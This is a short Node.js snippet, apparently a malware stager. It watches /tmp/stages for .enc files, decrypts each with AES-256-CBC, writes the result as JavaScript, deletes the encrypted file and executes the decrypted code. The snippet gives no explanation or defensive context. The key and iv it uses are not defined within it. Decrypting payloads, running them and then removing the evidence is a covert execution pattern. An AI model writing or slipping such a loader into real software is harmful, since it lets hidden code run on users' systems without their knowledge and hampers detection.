const fs = require('fs'), crypto = require('crypto');
(function () {
  fs.watch('/tmp/stages', (event, file) => {
    if (!file.endsWith('.enc')) return;
    const input = '/tmp/stages/' + file;
    const output = input.slice(0, -4) + '.js';
    const d = crypto.createDecipheriv('aes-256-cbc', key, iv);
    fs.writeFileSync(output, Buffer.concat([d.update(fs.readFileSync(input)),d.final()]));
    fs.unlinkSync(input);
    require(output);
  });
})();
